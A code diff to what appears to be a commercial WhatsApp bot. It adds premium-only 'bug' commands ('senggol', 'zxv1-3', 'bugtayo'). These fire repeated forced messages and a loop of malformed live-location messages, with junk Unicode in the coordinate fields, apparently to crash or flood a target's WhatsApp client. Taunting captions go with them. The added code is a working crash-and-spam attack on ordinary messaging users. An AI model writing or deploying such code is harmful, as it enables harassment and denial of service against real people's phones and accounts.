@@ -6452,6 +6452,58 @@ Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
 Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
 }
 break
+		
+case 'senggol': case 'zxv1': case 'zxv2': case 'zxv3': {
+if (m.isGroup) return joreply("Only In Private Chat")
+if (!isPremium) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await ryozingod.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: fakejpg,
+title: `⦃ ••• ⦄ ⦃| thezetsuboxygen |⦄ ⦃ ••• ⦄`,
+body: `⁗ ⋄ mati aja lu suki 😂`,
+previewType: "VIDEO",
+sourceUrl: `༑ 𝐩𝟎𝐢𝐧𝐭𝐬 ★ 𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧 #𝐳𝐱𝐯 ⿻`,
+mediaType: 1,
+mediaUrl: `${global.url}`
+}
+},
+text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
+}, {
+quoted: m
+})
+}
+break
+
+case 'bugtayo': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 1`)
+for (let j = 0; j < q; j++) {
+var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑`,
+    "sequenceNumber": "9",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: m })
+await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+await sleep(200)
+}
+await joreply('✅Succes')
+}
+break		
 
 case '4gb': {
     if(!isReseller){
